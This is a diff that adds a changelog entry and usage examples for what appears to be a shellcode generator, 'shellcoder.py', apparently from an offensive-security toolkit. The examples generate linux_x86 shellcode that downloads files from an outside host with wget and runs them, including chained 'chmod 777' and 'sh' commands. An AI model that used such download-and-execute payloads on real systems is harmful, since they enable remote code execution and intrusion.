@@ -1,3 +1,29 @@
+version 1.0.2: SKIP
+[linux_x86 modules completed]
+add script_executor() [linux - using command execution]
+add download_execute() [linux_x86 - using command execution (wget)]  
+add download() [linux_x86 - using command execution (wget)] 
+add dir_create() [linux_x86 using command execution] 
+add file_create() [linux_x86 using command execution]
+add encodes file for next version released
+
+Examples:
+>python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello.txt','hello') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job file_create('/root/Desktop/hello2.txt','hello[space]world[space]!') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job dir_create('/root/Desktop/mydirectory') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job download('http://www.z3r0d4y.com/exploit.type','myfile.type') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','./myfile.type') -o file.txt
+
+#multi command
+>python shellcoder.py -os linux_x86 -encode none -job download_execute('http://www.z3r0d4y.com/exploit.type','myfile.type','chmod[space]777[space]myfile.type;sh[space]myfile.type') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job script_executor('script.type','D:\\myfile.type','./script.type') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job script_executor('z3r0d4y.sh','/root/z3r0d4y.sh','sh[space]z3r0d4y.sh') -o file.txt
+>python shellcoder.py -os linux_x86 -encode none -job script_executor('ali.py','/root/Desktop/0day.py','chmod[space]+x[space]ali.py;[space]python[space]ali.py') -o file.txt
+
+Note: Remember don't use " " and replace it with "[space]"
+Note: script_executor(),download_execute(),download(),dir_create(),file_create() are using linux command line , not the function. [wget,mkdir,echo]
+
+
 version 1.0.1: BOILING_POINT
 add system() [linux_x86 command execute]
 fixed chmod filename 1/4 char length [linux_x86]
